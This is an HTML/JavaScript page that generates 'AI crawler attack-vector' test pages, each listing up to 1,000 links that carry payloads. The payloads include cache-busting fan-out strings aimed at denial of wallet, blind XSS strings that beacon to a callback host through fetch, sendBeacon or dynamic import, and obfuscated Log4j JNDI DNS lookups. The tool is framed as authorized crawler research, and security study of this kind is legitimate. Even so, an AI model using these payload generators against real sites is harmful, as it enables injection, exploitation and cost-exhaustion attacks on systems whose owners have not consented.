<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="Generate bounded pages for authorized AI crawler research.">
  <title>AI crawler attack-vector generator</title>
  <style>
    :root { color-scheme: light dark; font-family: system-ui, sans-serif; }
    body { max-width: 54rem; margin: 2rem auto; padding: 0 1rem 3rem; }
    form { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1rem; }
    label { display: grid; gap: .35rem; font-weight: 600; }
    .wide, .actions, #error, details { grid-column: 1 / -1; }
    input, select, textarea, button { font: inherit; padding: .6rem; }
    textarea { min-height: 5rem; resize: vertical; }
    button { cursor: pointer; }
    fieldset { border: 1px solid #8888; border-radius: .4rem; padding: 1rem; }
    legend, .vector-groups h2 { font-weight: 700; }
    .vector-groups { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1.5rem; }
    .vector-groups h2 { font-size: 1rem; margin: 0 0 .7rem; }
    .vector-option { display: grid; grid-template-columns: auto 1fr; align-items: start; gap: .15rem .5rem; margin-top: .65rem; cursor: pointer; }
    .vector-option input { grid-row: 1 / 3; margin-top: .15rem; }
    .vector-option small { color: #666; }
    details { border: 1px solid #8888; border-radius: .4rem; padding: .8rem; }
    summary { cursor: pointer; font-weight: 700; }
    .advanced { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1rem; margin-top: 1rem; }
    .actions { display: flex; gap: .6rem; flex-wrap: wrap; }
    #error { color: #c62828; min-height: 1.5rem; }
    #output { min-height: 14rem; width: 100%; box-sizing: border-box; }
    iframe { width: 100%; min-height: 18rem; border: 1px solid #8888; background: white; }
    small { font-weight: 400; }
    #results { margin-top: 2rem; }
    #results details { margin-top: 1rem; }
    [hidden] { display: none !important; }
    @media (max-width: 45rem) { form, .advanced, .vector-groups { grid-template-columns: 1fr; } }
  </style>
</head>
<body>
  <h1>AI crawler attack-vector generator</h1>
  <p>Generate a bounded static test page. Everything runs locally in this browser.</p>

  <form id="generator">
    <label class="wide">Authorized target URLs, one per line
      <textarea id="targets" required>https://owned.example.test/resource</textarea>
    </label>
    <fieldset id="payload" class="wide">
      <legend>Attack vector</legend>
      <div class="vector-groups">
        <section>
          <h2>DoS / Denial of Wallet</h2>
          <label class="vector-option">
            <input type="radio" name="payload" value="cache-bust" checked>
            <span>Cache-busting fan-out</span>
            <small>1,000 unique value layouts for crawler and cache-cost tests.</small>
          </label>
          <label class="vector-option">
            <input type="radio" name="payload" value="marker">
            <span>Unique-request fan-out</span>
            <small>1,000 traceable value layouts for controlled fan-out tests.</small>
          </label>
        </section>
        <section>
          <h2>OOB attacks</h2>
          <label class="vector-option">
            <input type="radio" name="payload" value="blind-xss">
            <span>Blind XSS</span>
            <small>1,000 callback-only context, event, and beacon combinations.</small>
          </label>
          <label class="vector-option">
            <input type="radio" name="payload" value="log4j-dns">
            <span>Log4j lookup</span>
            <small>1,000 DNS-only obfuscations; no class loading or commands.</small>
          </label>
        </section>
      </div>
    </fieldset>
    <label>Number of generated links
      <input id="count" type="number" min="1" max="1000" value="1000" required>
    </label>
    <label id="callbackField" class="wide" hidden>Callback hostname or URL
      <input id="callback" placeholder="callback.example.test">
      <small>Bare hostnames use HTTPS for blind XSS.</small>
    </label>
    <details>
      <summary>Advanced options</summary>
      <div class="advanced">
        <label>Page title
          <input id="title" value="Authorized AI crawler test">
        </label>
        <label>Experiment token <small>Random when empty</small>
          <input id="token" placeholder="demo-1">
        </label>
        <label>Payload position
          <select id="position">
            <option value="query">Query parameter</option>
            <option value="path">Path segment</option>
          </select>
        </label>
        <label>Query parameter
          <input id="parameter" value="ai_bot_poc">
        </label>
        <label>Link-text mode
          <select id="textMode">
            <option value="increment">Increment</option>
            <option value="cycle">Cycle through list</option>
            <option value="random">Random</option>
          </select>
        </label>
        <label>Text template/list <small>Use {n} for the link number</small>
          <textarea id="texts">item {n}</textarea>
        </label>
      </div>
    </details>
    <div id="error" role="alert" aria-live="polite"></div>
    <div class="actions">
      <button type="submit">Generate preview</button>
      <button id="download" type="button" disabled>Download generated HTML</button>
    </div>
  </form>

  <section id="results" hidden>
    <h2>Preview</h2>
    <iframe id="preview" title="Generated page preview" sandbox></iframe>
    <details>
      <summary>Generated HTML source</summary>
      <textarea id="output" readonly aria-label="Generated HTML source"></textarea>
    </details>
  </section>

  <script>
    const byId = id => document.getElementById(id);
    const selectedPayload = () => document.querySelector('input[name="payload"]:checked').value;
    let generated = "";

    function escapeHtml(value) {
      return value.replaceAll("&", "&amp;").replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#39;");
    }

    function randomText(length = 12) {
      const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      const values = crypto.getRandomValues(new Uint8Array(length));
      return Array.from(values, value => alphabet[value % alphabet.length]).join("");
    }

    function callbackUrl(value) {
      const url = new URL(value.includes("://") ? value : `https://${value}`);
      if (!['http:', 'https:'].includes(url.protocol) || !url.hostname)
        throw new Error("The callback must be an HTTP(S) URL or hostname.");
      if (url.username || url.password || url.search || url.hash)
        throw new Error("The callback must not contain credentials, a query, or a fragment.");
      return `${url.protocol}//${url.host}${url.pathname.replace(/\/$/, '')}`;
    }

    function callbackHost(value) {
      return new URL(callbackUrl(value)).hostname;
    }

    function fanoutPayload(kind, n, token) {
      const prefixes = {
        "marker": ["marker", "trace", "probe", "request", "crawler", "visit", "link", "item", "resource", "poc"],
        "cache-bust": ["cb", "nocache", "fresh", "bypass", "unique", "version", "cache", "miss", "nonce", "buster"],
      }[kind];
      const separators = ["-", ".", "_", "~", "!", "$", ":", "/", ",", ";"];
      const index = n - 1;
      const prefix = prefixes[index % 10];
      const separator = separators[Math.floor(index / 10) % 10];
      const shape = Math.floor(index / 100) % 10;
      const numbers = [String(n), String(n).padStart(4, "0"), n.toString(16), n.toString(8), n.toString(2)];
      const number = numbers[shape % 5];
      const layouts = [
        [prefix, token, number], [token, prefix, number],
        [prefix, number, token], [number, prefix, token],
        [prefix + token, number], [prefix, token + number],
        [token, number, prefix], [number, token, prefix],
        [prefix + number, token], [token, prefix + number],
      ];
      return layouts[shape].join(separator);
    }

    function blindXssPayload(n, beacon) {
      const prefixes = ['">', "'>", "</title>", "</textarea>", "</scr" + "ipt>"];
      const elements = [
        ['<img src=x {event}="this.onerror=null;{js}">', "onerror"],
        ['<svg {event}="{js}">', "onload"],
        ['<details open {event}="{js}">', "ontoggle"],
        ['<video src=x {event}="this.onerror=null;{js}">', "onerror"],
        ['<input autofocus {event}="{js}">', "onfocus"],
      ];
      const beacons = [
        "fetch('{beacon}',{mode:'no-cors'})",
        "(new Image).src='{beacon}'",
        "navigator.sendBeacon('{beacon}')",
        "location.assign('{beacon}')",
        "import('{beacon}')",
      ];
      const index = n - 1;
      const prefix = prefixes[index % 5];
      const [element, eventName] = elements[Math.floor(index / 5) % 5];
      const javascript = beacons[Math.floor(index / 25) % 5].replace("{beacon}", beacon);
      const caseMask = Math.floor(index / 125) % 8;
      const event = Array.from(eventName, (character, position) =>
        position < 3 && caseMask & (1 << position) ? character.toUpperCase() : character
      ).join("");
      return prefix + element.replace("{event}", event).replace("{js}", javascript);
    }

    function obfuscatedWord(word, index) {
      const pieces = [];
      for (const character of word) {
        const forms = [character, `\${lower:${character.toUpperCase()}}`, `\${::-${character}}`];
        pieces.push(forms[index % 3]);
        index = Math.floor(index / 3);
      }
      return [pieces.join(""), index];
    }

    function log4jDnsPayload(n, token, callback) {
      let index = n - 1;
      let jndi;
      [jndi, index] = obfuscatedWord("jndi", index);
      const [dns] = obfuscatedWord("dns", index);
      const path = `ai-bot-poc-${encodeURIComponent(token)}-${n}`;
      return `\${${jndi}:${dns}://${callbackHost(callback)}/${path}}`;
    }

    function payloadFor(kind, n, target, token, callback, custom) {
      if (kind === "marker" || kind === "cache-bust") return fanoutPayload(kind, n, token);
      if (kind === "blind-xss") {
        const beacon = `${callbackUrl(callback)}/ai-bot-poc/${encodeURIComponent(token)}/${n}`;
        return blindXssPayload(n, beacon);
      }
      if (kind === "log4j-dns") return log4jDnsPayload(n, token, callback);
      if (!custom) throw new Error("A custom payload template is required.");
      return custom.replaceAll("{n}", n).replaceAll("{target}", target)
        .replaceAll("{token}", token).replaceAll("{callback}", callback);
    }

    function addPayload(target, payload, position, parameter) {
      const url = new URL(target);
      if (!['http:', 'https:'].includes(url.protocol)) throw new Error(`Target must use HTTP(S): ${target}`);
      url.hash = "";
      if (position === "path") url.pathname = `${url.pathname.replace(/\/$/, '')}/${encodeURIComponent(payload)}`;
      else url.searchParams.append(parameter, payload);
      return url.href;
    }

    function makePage() {
      const targets = byId("targets").value.split(/\r?\n/).map(x => x.trim()).filter(x => x && !x.startsWith("#"));
      const count = Number(byId("count").value);
      if (!targets.length) throw new Error("Enter at least one target URL.");
      if (!Number.isInteger(count) || count < 1 || count > 1000) throw new Error("Link count must be between 1 and 1,000.");

      targets.forEach(target => {
        const url = new URL(target);
        if (!['http:', 'https:'].includes(url.protocol)) throw new Error(`Target must use HTTP(S): ${target}`);
      });
      const parameter = byId("parameter").value;
      if (!parameter || /[&=?#]/.test(parameter)) throw new Error("Enter a simple query-parameter name.");
      const kind = selectedPayload();
      const callback = byId("callback").value.trim();
      if ((kind === "blind-xss" || kind === "log4j-dns") && !callback) throw new Error("This payload requires a controlled callback.");

      const token = byId("token").value.trim() || randomText(8);
      const mode = byId("textMode").value;
      const texts = byId("texts").value.split(/\r?\n/).filter(Boolean);
      const title = byId("title").value;
      const links = [];
      for (let n = 1; n <= count; n++) {
        const target = targets[(n - 1) % targets.length];
        const payload = payloadFor(kind, n, target, token, callback, "");
        const href = addPayload(target, payload, byId("position").value, parameter);
        let label = `item ${n}`;
        if (mode === "random") label = randomText();
        else if (mode === "increment") label = (texts[0] || "item {n}").replaceAll("{n}", n);
        else label = (texts[(n - 1) % (texts.length || 1)] || "item {n}").replaceAll("{n}", n);
        links.push(`    <li><a href="${escapeHtml(href)}">${escapeHtml(label)}</a></li>`);
      }
      const safeTitle = escapeHtml(title);
      return `<!doctype html>\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n  <title>${safeTitle}</title>\n</head>\n<body>\n  <h1>${safeTitle}</h1>\n  <ol>\n${links.join("\n")}\n  </ol>\n</body>\n</html>\n`;
    }

    byId("generator").addEventListener("submit", event => {
      event.preventDefault();
      byId("error").textContent = "";
      try {
        generated = makePage();
        byId("output").value = generated;
        byId("preview").srcdoc = generated;
        byId("results").hidden = false;
        byId("download").disabled = false;
      } catch (error) {
        byId("error").textContent = error.message;
      }
    });

    function updatePayloadUi() {
      const kind = selectedPayload();
      const callback = byId("callback");
      const needsCallback = ["blind-xss", "log4j-dns"].includes(kind);
      callback.required = needsCallback;
      byId("callbackField").hidden = !needsCallback;
    }

    byId("payload").addEventListener("change", updatePayloadUi);
    updatePayloadUi();

    byId("download").addEventListener("click", () => {
      const url = URL.createObjectURL(new Blob([generated], {type: "text/html"}));
      const link = Object.assign(document.createElement("a"), {href: url, download: "poc.html"});
      link.click();
      URL.revokeObjectURL(url);
    });
  </script>
</body>
</html>
